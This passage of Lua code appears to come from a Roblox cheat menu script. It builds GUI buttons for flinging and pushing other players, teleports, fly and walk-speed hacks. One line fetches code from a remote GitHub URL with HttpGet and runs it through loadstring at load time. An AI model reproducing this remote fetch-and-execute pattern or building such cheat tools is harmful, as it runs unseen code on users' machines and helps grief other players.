Animations_Section_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Animations_Section_Button.BackgroundTransparency = 0.500
Animations_Section_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Animations_Section_Button.BorderSizePixel = 0
Animations_Section_Button.Position = UDim2.new(0, 0, 0, 185)
Animations_Section_Button.Size = UDim2.new(0, 105, 0, 30)
Animations_Section_Button.Font = Enum.Font.Oswald
Animations_Section_Button.Text = "Animations"
Animations_Section_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Animations_Section_Button.TextScaled = true
Animations_Section_Button.TextSize = 14.000
Animations_Section_Button.TextWrapped = true

Misc_Section_Button.Name = "Misc_Section_Button"
Misc_Section_Button.Parent = SectionList
Misc_Section_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Misc_Section_Button.BackgroundTransparency = 0.500
Misc_Section_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Misc_Section_Button.BorderSizePixel = 0
Misc_Section_Button.Position = UDim2.new(0, 0, 0, 225)
Misc_Section_Button.Size = UDim2.new(0, 105, 0, 30)
Misc_Section_Button.Font = Enum.Font.Oswald
Misc_Section_Button.Text = "Misc"
Misc_Section_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Misc_Section_Button.TextScaled = true
Misc_Section_Button.TextSize = 14.000
Misc_Section_Button.TextWrapped = true

Credits_Section_Button.Name = "Credits_Section_Button"
Credits_Section_Button.Parent = SectionList
Credits_Section_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Credits_Section_Button.BackgroundTransparency = 0.500
Credits_Section_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Credits_Section_Button.BorderSizePixel = 0
Credits_Section_Button.Position = UDim2.new(0, 0, 0, 265)
Credits_Section_Button.Size = UDim2.new(0, 105, 0, 30)
Credits_Section_Button.Font = Enum.Font.Oswald
Credits_Section_Button.Text = "Credits"
Credits_Section_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Credits_Section_Button.TextScaled = true
Credits_Section_Button.TextSize = 14.000
Credits_Section_Button.TextWrapped = true

Game_Section.Name = "Game_Section"
Game_Section.Parent = Background
Game_Section.Active = true
Game_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Game_Section.BackgroundTransparency = 1.000
Game_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
Game_Section.BorderSizePixel = 0
Game_Section.Position = UDim2.new(0, 105, 0, 30)
Game_Section.Size = UDim2.new(0, 395, 0, 320)
Game_Section.Visible = false
Game_Section.CanvasSize = UDim2.new(0, 0, 1.85, 0)
Game_Section.ScrollBarThickness = 5

AntiRagdoll_Button.Name = "AntiRagdoll_Button"
AntiRagdoll_Button.Parent = Game_Section
AntiRagdoll_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
AntiRagdoll_Button.BackgroundTransparency = 0.500
AntiRagdoll_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
AntiRagdoll_Button.BorderSizePixel = 0
AntiRagdoll_Button.Position = UDim2.new(0, 25, 0, 25)
AntiRagdoll_Button.Size = UDim2.new(0, 150, 0, 30)
AntiRagdoll_Button.Font = Enum.Font.Oswald
AntiRagdoll_Button.Text = "Anti ragdoll"
AntiRagdoll_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
AntiRagdoll_Button.TextScaled = true
AntiRagdoll_Button.TextSize = 14.000
AntiRagdoll_Button.TextWrapped = true

PotionFling_Button.Name = "PotionFling_Button"
PotionFling_Button.Parent = Game_Section
PotionFling_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PotionFling_Button.BackgroundTransparency = 0.500
PotionFling_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PotionFling_Button.BorderSizePixel = 0
PotionFling_Button.Position = UDim2.new(0, 210, 0, 75)
PotionFling_Button.Size = UDim2.new(0, 150, 0, 30)
PotionFling_Button.Font = Enum.Font.Oswald
PotionFling_Button.Text = "Potion Fling"
PotionFling_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PotionFling_Button.TextScaled = true
PotionFling_Button.TextSize = 14.000
PotionFling_Button.TextWrapped = true

SpamMines_Button.Name = "SpamMines_Button"
SpamMines_Button.Parent = Game_Section
SpamMines_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
SpamMines_Button.BackgroundTransparency = 0.500
SpamMines_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
SpamMines_Button.BorderSizePixel = 0
SpamMines_Button.Position = UDim2.new(0, 25, 0, 75)
SpamMines_Button.Size = UDim2.new(0, 150, 0, 30)
SpamMines_Button.Font = Enum.Font.Oswald
SpamMines_Button.Text = "Spam mines"
SpamMines_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
SpamMines_Button.TextScaled = true
SpamMines_Button.TextSize = 14.000
SpamMines_Button.TextWrapped = true

PushAura_Button.Name = "PushAura_Button"
PushAura_Button.Parent = Game_Section
PushAura_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PushAura_Button.BackgroundTransparency = 0.500
PushAura_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PushAura_Button.BorderSizePixel = 0
PushAura_Button.Position = UDim2.new(0, 210, 0, 25)
PushAura_Button.Size = UDim2.new(0, 150, 0, 30)
PushAura_Button.Font = Enum.Font.Oswald
PushAura_Button.Text = "Push aura"
PushAura_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PushAura_Button.TextScaled = true
PushAura_Button.TextSize = 14.000
PushAura_Button.TextWrapped = true

BreakCannons_Button.Name = "BreakCannons_Button"
BreakCannons_Button.Parent = Game_Section
BreakCannons_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
BreakCannons_Button.BackgroundTransparency = 0.500
BreakCannons_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
BreakCannons_Button.BorderSizePixel = 0
BreakCannons_Button.Position = UDim2.new(0, 25, 0, 225)
BreakCannons_Button.Size = UDim2.new(0, 150, 0, 30)
BreakCannons_Button.Font = Enum.Font.Oswald
BreakCannons_Button.Text = "Break Cannons"
BreakCannons_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
BreakCannons_Button.TextScaled = true
BreakCannons_Button.TextSize = 14.000
BreakCannons_Button.TextWrapped = true

LethalCannons_Button.Name = "LethalCannons_Button"
LethalCannons_Button.Parent = Game_Section
LethalCannons_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
LethalCannons_Button.BackgroundTransparency = 0.500
LethalCannons_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
LethalCannons_Button.BorderSizePixel = 0
LethalCannons_Button.Position = UDim2.new(0, 25, 0, 275)
LethalCannons_Button.Size = UDim2.new(0, 150, 0, 30)
LethalCannons_Button.Font = Enum.Font.Oswald
LethalCannons_Button.Text = "Lethal Cannons"
LethalCannons_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
LethalCannons_Button.TextScaled = true
LethalCannons_Button.TextSize = 14.000
LethalCannons_Button.TextWrapped = true

ChatAlert_Button.Name = "ChatAlert_Button"
ChatAlert_Button.Parent = Game_Section
ChatAlert_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ChatAlert_Button.BackgroundTransparency = 0.500
ChatAlert_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ChatAlert_Button.BorderSizePixel = 0
ChatAlert_Button.Position = UDim2.new(0, 210, 0, 275)
ChatAlert_Button.Size = UDim2.new(0, 150, 0, 30)
ChatAlert_Button.Font = Enum.Font.Oswald
ChatAlert_Button.Text = "Chat alert"
ChatAlert_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ChatAlert_Button.TextScaled = true
ChatAlert_Button.TextSize = 14.000
ChatAlert_Button.TextWrapped = true

PotionDi_Button.Name = "PotionDi_Button"
PotionDi_Button.Parent = Game_Section
PotionDi_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PotionDi_Button.BackgroundTransparency = 0.500
PotionDi_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PotionDi_Button.BorderSizePixel = 0
PotionDi_Button.Position = UDim2.new(0, 210, 0, 125)
PotionDi_Button.Size = UDim2.new(0, 150, 0, 30)
PotionDi_Button.Font = Enum.Font.Oswald
PotionDi_Button.Text = "Potion dick"
PotionDi_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PotionDi_Button.TextScaled = true
PotionDi_Button.TextSize = 14.000
PotionDi_Button.TextWrapped = true

VoidProtection_Button.Name = "VoidProtection_Button"
VoidProtection_Button.Parent = Game_Section
VoidProtection_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
VoidProtection_Button.BackgroundTransparency = 0.500
VoidProtection_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
VoidProtection_Button.BorderSizePixel = 0
VoidProtection_Button.Position = UDim2.new(0, 25, 0, 175)
VoidProtection_Button.Size = UDim2.new(0, 150, 0, 30)
VoidProtection_Button.Font = Enum.Font.Oswald
VoidProtection_Button.Text = "Void protection"
VoidProtection_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
VoidProtection_Button.TextScaled = true
VoidProtection_Button.TextSize = 14.000
VoidProtection_Button.TextWrapped = true

PushAll_Button.Name = "PushAll_Button"
PushAll_Button.Parent = Game_Section
PushAll_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PushAll_Button.BackgroundTransparency = 0.500
PushAll_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PushAll_Button.BorderSizePixel = 0
PushAll_Button.Position = UDim2.new(0, 210, 0, 225)
PushAll_Button.Size = UDim2.new(0, 150, 0, 30)
PushAll_Button.Font = Enum.Font.Oswald
PushAll_Button.Text = "Push all"
PushAll_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PushAll_Button.TextScaled = true
PushAll_Button.TextSize = 14.000
PushAll_Button.TextWrapped = true

TouchFling_Button.Name = "TouchFling_Button"
TouchFling_Button.Parent = Game_Section
TouchFling_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
TouchFling_Button.BackgroundTransparency = 0.500
TouchFling_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
TouchFling_Button.BorderSizePixel = 0
TouchFling_Button.Position = UDim2.new(0, 25, 0, 125)
TouchFling_Button.Size = UDim2.new(0, 150, 0, 30)
TouchFling_Button.Font = Enum.Font.Oswald
TouchFling_Button.Text = "Touch fling"
TouchFling_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
TouchFling_Button.TextScaled = true
TouchFling_Button.TextSize = 14.000
TouchFling_Button.TextWrapped = true

CMDBar.Name = "CMDBar"
CMDBar.Parent = Game_Section
CMDBar.AnchorPoint = Vector2.new(0.5, 0.5)
CMDBar.BackgroundColor3 = Color3.fromRGB(0, 140, 140)
CMDBar.BackgroundTransparency = 0.300
CMDBar.BorderColor3 = Color3.fromRGB(0, 255, 255)
CMDBar.Position = UDim2.new(0.5, 0, 0, 350)
CMDBar.Size = UDim2.new(0, 275, 0, 40)
CMDBar.Font = Enum.Font.Gotham
CMDBar.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
CMDBar.PlaceholderText = "CMD BAR..."
CMDBar.Text = ""
CMDBar.TextColor3 = Color3.fromRGB(20, 20, 20)
CMDBar.TextSize = 14.000
CMDBar.TextWrapped = true

CannonTP1_Button.Name = "CannonTP1_Button"
CannonTP1_Button.Parent = Game_Section
CannonTP1_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
CannonTP1_Button.BackgroundTransparency = 0.500
CannonTP1_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
CannonTP1_Button.BorderSizePixel = 0
CannonTP1_Button.Position = UDim2.new(0, 25, 0, 400)
CannonTP1_Button.Size = UDim2.new(0, 150, 0, 30)
CannonTP1_Button.Font = Enum.Font.Oswald
CannonTP1_Button.Text = "TP Cannon 1"
CannonTP1_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
CannonTP1_Button.TextScaled = true
CannonTP1_Button.TextSize = 14.000
CannonTP1_Button.TextWrapped = true

CannonTP2_Button.Name = "CannonTP2_Button"
CannonTP2_Button.Parent = Game_Section
CannonTP2_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
CannonTP2_Button.BackgroundTransparency = 0.500
CannonTP2_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
CannonTP2_Button.BorderSizePixel = 0
CannonTP2_Button.Position = UDim2.new(0, 210, 0, 400)
CannonTP2_Button.Size = UDim2.new(0, 150, 0, 30)
CannonTP2_Button.Font = Enum.Font.Oswald
CannonTP2_Button.Text = "TP Cannon 2"
CannonTP2_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
CannonTP2_Button.TextScaled = true
CannonTP2_Button.TextSize = 14.000
CannonTP2_Button.TextWrapped = true

CannonTP3_Button.Name = "CannonTP3_Button"
CannonTP3_Button.Parent = Game_Section
CannonTP3_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
CannonTP3_Button.BackgroundTransparency = 0.500
CannonTP3_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
CannonTP3_Button.BorderSizePixel = 0
CannonTP3_Button.Position = UDim2.new(0, 25, 0, 450)
CannonTP3_Button.Size = UDim2.new(0, 150, 0, 30)
CannonTP3_Button.Font = Enum.Font.Oswald
CannonTP3_Button.Text = "TP Cannon 3"
CannonTP3_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
CannonTP3_Button.TextScaled = true
CannonTP3_Button.TextSize = 14.000
CannonTP3_Button.TextWrapped = true

MinefieldTP_Button.Name = "MinefieldTP_Button"
MinefieldTP_Button.Parent = Game_Section
MinefieldTP_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
MinefieldTP_Button.BackgroundTransparency = 0.500
MinefieldTP_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
MinefieldTP_Button.BorderSizePixel = 0
MinefieldTP_Button.Position = UDim2.new(0, 210, 0, 450)
MinefieldTP_Button.Size = UDim2.new(0, 150, 0, 30)
MinefieldTP_Button.Font = Enum.Font.Oswald
MinefieldTP_Button.Text = "TP Minefield"
MinefieldTP_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
MinefieldTP_Button.TextScaled = true
MinefieldTP_Button.TextSize = 14.000
MinefieldTP_Button.TextWrapped = true

BallonTP_Button.Name = "BallonTP_Button"
BallonTP_Button.Parent = Game_Section
BallonTP_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
BallonTP_Button.BackgroundTransparency = 0.500
BallonTP_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
BallonTP_Button.BorderSizePixel = 0
BallonTP_Button.Position = UDim2.new(0, 25, 0, 500)
BallonTP_Button.Size = UDim2.new(0, 150, 0, 30)
BallonTP_Button.Font = Enum.Font.Oswald
BallonTP_Button.Text = "TP Ballon"
BallonTP_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
BallonTP_Button.TextScaled = true
BallonTP_Button.TextSize = 14.000
BallonTP_Button.TextWrapped = true

NormalStairsTP_Button.Name = "NormalStairsTP_Button"
NormalStairsTP_Button.Parent = Game_Section
NormalStairsTP_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
NormalStairsTP_Button.BackgroundTransparency = 0.500
NormalStairsTP_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
NormalStairsTP_Button.BorderSizePixel = 0
NormalStairsTP_Button.Position = UDim2.new(0, 210, 0, 500)
NormalStairsTP_Button.Size = UDim2.new(0, 150, 0, 30)
NormalStairsTP_Button.Font = Enum.Font.Oswald
NormalStairsTP_Button.Text = "TP Stairs"
NormalStairsTP_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
NormalStairsTP_Button.TextScaled = true
NormalStairsTP_Button.TextSize = 14.000
NormalStairsTP_Button.TextWrapped = true

MovingStairsTP_Button.Name = "MovingStairsTP_Button"
MovingStairsTP_Button.Parent = Game_Section
MovingStairsTP_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
MovingStairsTP_Button.BackgroundTransparency = 0.500
MovingStairsTP_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
MovingStairsTP_Button.BorderSizePixel = 0
MovingStairsTP_Button.Position = UDim2.new(0, 25, 0, 550)
MovingStairsTP_Button.Size = UDim2.new(0, 150, 0, 30)
MovingStairsTP_Button.Font = Enum.Font.Oswald
MovingStairsTP_Button.Text = "TP Moving Stairs"
MovingStairsTP_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
MovingStairsTP_Button.TextScaled = true
MovingStairsTP_Button.TextSize = 14.000
MovingStairsTP_Button.TextWrapped = true

SpiralStairsTP_Button.Name = "SpiralStairsTP_Button"
SpiralStairsTP_Button.Parent = Game_Section
SpiralStairsTP_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
SpiralStairsTP_Button.BackgroundTransparency = 0.500
SpiralStairsTP_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
SpiralStairsTP_Button.BorderSizePixel = 0
SpiralStairsTP_Button.Position = UDim2.new(0, 210, 0, 550)
SpiralStairsTP_Button.Size = UDim2.new(0, 150, 0, 30)
SpiralStairsTP_Button.Font = Enum.Font.Oswald
SpiralStairsTP_Button.Text = "TP Spiral Stairs"
SpiralStairsTP_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
SpiralStairsTP_Button.TextScaled = true
SpiralStairsTP_Button.TextSize = 14.000
SpiralStairsTP_Button.TextWrapped = true

SkyscraperTP_Button.Name = "SkyscraperTP_Button"
SkyscraperTP_Button.Parent = Game_Section
SkyscraperTP_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
SkyscraperTP_Button.BackgroundTransparency = 0.500
SkyscraperTP_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
SkyscraperTP_Button.BorderSizePixel = 0
SkyscraperTP_Button.Position = UDim2.new(0, 25, 0, 600)
SkyscraperTP_Button.Size = UDim2.new(0, 150, 0, 30)
SkyscraperTP_Button.Font = Enum.Font.Oswald
SkyscraperTP_Button.Text = "TP Skyscraper"
SkyscraperTP_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
SkyscraperTP_Button.TextScaled = true
SkyscraperTP_Button.TextSize = 14.000
SkyscraperTP_Button.TextWrapped = true

PoolTP_Button.Name = "PoolTP_Button"
PoolTP_Button.Parent = Game_Section
PoolTP_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
PoolTP_Button.BackgroundTransparency = 0.500
PoolTP_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
PoolTP_Button.BorderSizePixel = 0
PoolTP_Button.Position = UDim2.new(0, 210, 0, 600)
PoolTP_Button.Size = UDim2.new(0, 150, 0, 30)
PoolTP_Button.Font = Enum.Font.Oswald
PoolTP_Button.Text = "TP Pool"
PoolTP_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
PoolTP_Button.TextScaled = true
PoolTP_Button.TextSize = 14.000
PoolTP_Button.TextWrapped = true

FreePushTool_Button.Name = "FreePushTool_Button"
FreePushTool_Button.Parent = Game_Section
FreePushTool_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
FreePushTool_Button.BackgroundTransparency = 0.500
FreePushTool_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
FreePushTool_Button.BorderSizePixel = 0
FreePushTool_Button.Position = UDim2.new(0, 210, 0, 175)
FreePushTool_Button.Size = UDim2.new(0, 150, 0, 30)
FreePushTool_Button.Font = Enum.Font.Oswald
FreePushTool_Button.Text = "Modded push"
FreePushTool_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
FreePushTool_Button.TextScaled = true
FreePushTool_Button.TextSize = 14.000
FreePushTool_Button.TextWrapped = true

Home_Section.Name = "Home_Section"
Home_Section.Parent = Background
Home_Section.Active = true
Home_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Home_Section.BackgroundTransparency = 1.000
Home_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
Home_Section.BorderSizePixel = 0
Home_Section.Position = UDim2.new(0, 105, 0, 30)
Home_Section.Size = UDim2.new(0, 395, 0, 320)
Home_Section.CanvasSize = UDim2.new(0, 0, 0, 0)
Home_Section.ScrollBarThickness = 5

Profile_Image.Name = "Profile_Image"
Profile_Image.Parent = Home_Section
Profile_Image.BackgroundColor3 = Color3.fromRGB(30,30,30)
Profile_Image.BorderColor3 = Color3.fromRGB(0, 0, 0)
Profile_Image.BorderSizePixel = 0
Profile_Image.Position = UDim2.new(0, 25, 0, 25)
Profile_Image.Size = UDim2.new(0, 100, 0, 100)
Profile_Image.Image = Players:GetUserThumbnailAsync(plr.UserId,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size420x420)

Welcome_Label.Name = "Welcome_Label"
Welcome_Label.Parent = Home_Section
Welcome_Label.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Welcome_Label.BackgroundTransparency = 1.000
Welcome_Label.BorderColor3 = Color3.fromRGB(0, 0, 0)
Welcome_Label.BorderSizePixel = 0
Welcome_Label.Position = UDim2.new(0, 150, 0, 25)
Welcome_Label.Size = UDim2.new(0, 200, 0, 100)
Welcome_Label.Font = Enum.Font.SourceSans
Welcome_Label.Text = ("¡Hello @"..plr.Name.."!\nPress [B] to open/close gui.")
Welcome_Label.TextColor3 = Color3.fromRGB(0, 255, 255)
Welcome_Label.TextSize = 24.000
Welcome_Label.TextWrapped = true
Welcome_Label.TextXAlignment = Enum.TextXAlignment.Left
Welcome_Label.TextYAlignment = Enum.TextYAlignment.Top

Announce_Label.Name = "Announce_Label"
Announce_Label.Parent = Home_Section
Announce_Label.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Announce_Label.BorderColor3 = Color3.fromRGB(0, 0, 0)
Announce_Label.BorderSizePixel = 0
Announce_Label.Position = UDim2.new(0, 25, 0, 150)
Announce_Label.Size = UDim2.new(0, 350, 0, 150)
Announce_Label.Font = Enum.Font.SourceSans
Announce_Label.Text = loadstring(game:HttpGet("https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/announce"))()
Announce_Label.TextColor3 = Color3.fromRGB(0, 255, 255)
Announce_Label.TextSize = 24.000
Announce_Label.TextWrapped = true
Announce_Label.TextXAlignment = Enum.TextXAlignment.Left
Announce_Label.TextYAlignment = Enum.TextYAlignment.Top

Character_Section.Name = "Character_Section"
Character_Section.Parent = Background
Character_Section.Active = true
Character_Section.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Character_Section.BackgroundTransparency = 1.000
Character_Section.BorderColor3 = Color3.fromRGB(0, 0, 0)
Character_Section.BorderSizePixel = 0
Character_Section.Position = UDim2.new(0, 105, 0, 30)
Character_Section.Size = UDim2.new(0, 395, 0, 320)
Character_Section.Visible = false
Character_Section.CanvasSize = UDim2.new(0, 0, 1, 0)
Character_Section.ScrollBarThickness = 5

WalkSpeed_Button.Name = "WalkSpeed_Button"
WalkSpeed_Button.Parent = Character_Section
WalkSpeed_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
WalkSpeed_Button.BackgroundTransparency = 0.500
WalkSpeed_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
WalkSpeed_Button.BorderSizePixel = 0
WalkSpeed_Button.Position = UDim2.new(0, 25, 0, 25)
WalkSpeed_Button.Size = UDim2.new(0, 150, 0, 30)
WalkSpeed_Button.Font = Enum.Font.Oswald
WalkSpeed_Button.Text = "Walk Speed"
WalkSpeed_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
WalkSpeed_Button.TextScaled = true
WalkSpeed_Button.TextSize = 14.000
WalkSpeed_Button.TextWrapped = true

WalkSpeed_Input.Name = "WalkSpeed_Input"
WalkSpeed_Input.Parent = Character_Section
WalkSpeed_Input.BackgroundColor3 = Color3.fromRGB(0, 140, 140)
WalkSpeed_Input.BackgroundTransparency = 0.300
WalkSpeed_Input.BorderColor3 = Color3.fromRGB(0, 255, 255)
WalkSpeed_Input.Position = UDim2.new(0, 210, 0, 25)
WalkSpeed_Input.Size = UDim2.new(0, 175, 0, 30)
WalkSpeed_Input.Font = Enum.Font.Gotham
WalkSpeed_Input.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
WalkSpeed_Input.PlaceholderText = "Number [1-99999]"
WalkSpeed_Input.Text = ""
WalkSpeed_Input.TextColor3 = Color3.fromRGB(20, 20, 20)
WalkSpeed_Input.TextSize = 14.000
WalkSpeed_Input.TextWrapped = true

ClearCheckpoint_Button.Name = "ClearCheckpoint_Button"
ClearCheckpoint_Button.Parent = Character_Section
ClearCheckpoint_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
ClearCheckpoint_Button.BackgroundTransparency = 0.500
ClearCheckpoint_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
ClearCheckpoint_Button.BorderSizePixel = 0
ClearCheckpoint_Button.Position = UDim2.new(0, 210, 0, 225)
ClearCheckpoint_Button.Size = UDim2.new(0, 150, 0, 30)
ClearCheckpoint_Button.Font = Enum.Font.Oswald
ClearCheckpoint_Button.Text = "Clear checkpoint"
ClearCheckpoint_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
ClearCheckpoint_Button.TextScaled = true
ClearCheckpoint_Button.TextSize = 14.000
ClearCheckpoint_Button.TextWrapped = true

JumpPower_Input.Name = "JumpPower_Input"
JumpPower_Input.Parent = Character_Section
JumpPower_Input.BackgroundColor3 = Color3.fromRGB(0, 140, 140)
JumpPower_Input.BackgroundTransparency = 0.300
JumpPower_Input.BorderColor3 = Color3.fromRGB(0, 255, 255)
JumpPower_Input.Position = UDim2.new(0, 210, 0, 75)
JumpPower_Input.Size = UDim2.new(0, 175, 0, 30)
JumpPower_Input.Font = Enum.Font.Gotham
JumpPower_Input.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
JumpPower_Input.PlaceholderText = "Number [1-99999]"
JumpPower_Input.Text = ""
JumpPower_Input.TextColor3 = Color3.fromRGB(20, 20, 20)
JumpPower_Input.TextSize = 14.000
JumpPower_Input.TextWrapped = true

JumpPower_Button.Name = "JumpPower_Button"
JumpPower_Button.Parent = Character_Section
JumpPower_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
JumpPower_Button.BackgroundTransparency = 0.500
JumpPower_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
JumpPower_Button.BorderSizePixel = 0
JumpPower_Button.Position = UDim2.new(0, 25, 0, 75)
JumpPower_Button.Size = UDim2.new(0, 150, 0, 30)
JumpPower_Button.Font = Enum.Font.Oswald
JumpPower_Button.Text = "Jump power"
JumpPower_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
JumpPower_Button.TextScaled = true
JumpPower_Button.TextSize = 14.000
JumpPower_Button.TextWrapped = true

SaveCheckpoint_Button.Name = "SaveCheckpoint_Button"
SaveCheckpoint_Button.Parent = Character_Section
SaveCheckpoint_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
SaveCheckpoint_Button.BackgroundTransparency = 0.500
SaveCheckpoint_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
SaveCheckpoint_Button.BorderSizePixel = 0
SaveCheckpoint_Button.Position = UDim2.new(0, 210, 0, 175)
SaveCheckpoint_Button.Size = UDim2.new(0, 150, 0, 30)
SaveCheckpoint_Button.Font = Enum.Font.Oswald
SaveCheckpoint_Button.Text = "Save checkpoint"
SaveCheckpoint_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
SaveCheckpoint_Button.TextScaled = true
SaveCheckpoint_Button.TextSize = 14.000
SaveCheckpoint_Button.TextWrapped = true

Respawn_Button.Name = "Respawn_Button"
Respawn_Button.Parent = Character_Section
Respawn_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
Respawn_Button.BackgroundTransparency = 0.500
Respawn_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
Respawn_Button.BorderSizePixel = 0
Respawn_Button.Position = UDim2.new(0, 25, 0, 225)
Respawn_Button.Size = UDim2.new(0, 150, 0, 30)
Respawn_Button.Font = Enum.Font.Oswald
Respawn_Button.Text = "Respawn"
Respawn_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
Respawn_Button.TextScaled = true
Respawn_Button.TextSize = 14.000
Respawn_Button.TextWrapped = true

FlySpeed_Button.Name = "FlySpeed_Button"
FlySpeed_Button.Parent = Character_Section
FlySpeed_Button.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
FlySpeed_Button.BackgroundTransparency = 0.500
FlySpeed_Button.BorderColor3 = Color3.fromRGB(0, 0, 0)
FlySpeed_Button.BorderSizePixel = 0
FlySpeed_Button.Position = UDim2.new(0, 25, 0, 125)
FlySpeed_Button.Size = UDim2.new(0, 150, 0, 30)
FlySpeed_Button.Font = Enum.Font.Oswald
FlySpeed_Button.Text = "Fly speed"
FlySpeed_Button.TextColor3 = Color3.fromRGB(0, 0, 0)
FlySpeed_Button.TextScaled = true
FlySpeed_Button.TextSize = 14.000
FlySpeed_Button.TextWrapped = true

FlySpeed_Input.Name = "FlySpeed_Input"
FlySpeed_Input.Parent = Character_Section
FlySpeed_Input.BackgroundColor3 = Color3.fromRGB(0, 140, 140)
FlySpeed_Input.BackgroundTransparency = 0.300
FlySpeed_Input.BorderColor3 = Color3.fromRGB(0, 255, 255)
FlySpeed_Input.Position = UDim2.new(0, 210, 0, 125)
FlySpeed_Input.Size = UDim2.new(0, 175, 0, 30)
FlySpeed_Input.Font = Enum.Font.Gotham
FlySpeed_Input.PlaceholderColor3 = Color3.fromRGB(0, 0, 0)
FlySpeed_Input.PlaceholderText = "Number [1-99999]"
FlySpeed_Input.Text = ""
FlySpeed_Input.TextColor3 = Color3.fromRGB(20, 20, 20)
FlySpeed_Input.TextSize = 14.000
FlySpeed_Input.TextWrapped = true

Fly_Button.Name = "Fly_Button"
